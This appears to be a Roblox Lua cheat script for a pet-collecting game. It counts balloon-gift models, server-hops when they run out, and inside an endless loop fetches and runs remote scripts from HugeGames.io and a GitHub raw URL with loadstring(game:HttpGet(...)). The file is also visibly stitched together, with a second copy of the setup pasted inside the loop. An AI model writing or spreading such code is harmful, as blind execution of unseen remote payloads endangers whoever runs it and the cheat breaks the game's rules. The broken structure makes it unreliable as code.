-- Get references to services
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Create a ScreenGui to hold the GUI elements
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create a TextLabel to display the count
local textLabel = Instance.new("TextLabel")
textLabel.Parent = screenGui
textLabel.Position = UDim2.new(0, 10, 0, 10)
textLabel.Size = UDim2.new(0, 200, 0, 50)
textLabel.Text = "Number of models in BalloonGifts folder: "
textLabel.TextScaled = true

-- Function to update the count and GUI
local function updateCount()
    -- Find the __THINGS folder within Workspace
    local thingsFolder = Workspace:FindFirstChild("__THINGS")
    
    -- Check if the __THINGS folder exists
    if thingsFolder then
        -- Find the BalloonGifts folder within the __THINGS folder
        local balloonGiftsFolder = thingsFolder:FindFirstChild("BalloonGifts")
        
        -- Check if the BalloonGifts folder exists
        if balloonGiftsFolder then
            -- Get all the models inside the BalloonGifts folder
            local balloonGiftModels = balloonGiftsFolder:GetChildren()
            
            -- Count the number of models
            local numModels = #balloonGiftModels
            
            -- Update the TextLabel with the count
            textLabel.Text = "Number of models in BalloonGifts folder: " .. tostring(numModels)
            
            -- Check if there are no balloons left
            if numModels == 1 then
                -- Run teleportation script if there are no balloons left
                local Player = game.Players.LocalPlayer    
                local Http = game:GetService("HttpService")
                local TPS = game:GetService("TeleportService")
                local Api = "https://games.roblox.com/v1/games/"
                
                local _place,_id = game.PlaceId, game.JobId
                local _servers = Api.._place.."/servers/Public?sortOrder=Desc&limit=100"
                function ListServers(cursor)
                   local Raw = game:HttpGet(_servers .. ((cursor and "&cursor="..cursor) or ""))
                   return Http:JSONDecode(Raw)
                end
                
                local Next; repeat
                   local Servers = ListServers(Next)
                   for i,v in next, Servers.data do
                       if v.playing < v.maxPlayers and v.id ~= _id then
                           local s,r = pcall(TPS.TeleportToPlaceInstance,TPS,_place,v.id,Player)
                           if s then break end
                       end
                   end
                   
                   Next = Servers.nextPageCursor
                until not Next
            end
        else
            textLabel.Text = "Number of models in BalloonGifts folder: BalloonGifts folder not found"
        end
    else
        textLabel.Text = "Number of models in BalloonGifts folder: __THINGS folder not found"
    end
end

-- Function to check if the game has finished loading
local function gameLoaded()
    return Workspace.StreamingEnabled and #Workspace:GetDescendants() > 0
end

-- Wait until the game has finished loading
repeat
    wait()
until gameLoaded()

-- Call the updateCount function initially
updateCount()

-- Set up a loop to update the count periodically
while true do
    -- Wait for a short duration before updating again
    wait(0.1) -- You can adjust the duration as needed
    
    -- Update the count
    updateCount()
    -- Get references to services
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Function to check if the game has finished loading
local function gameLoaded()
    return Workspace.StreamingEnabled and #Workspace:GetDescendants() > 0
end

-- Wait until the game has finished loading
repeat
    wait()
until gameLoaded()

-- Load the external script
loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
end
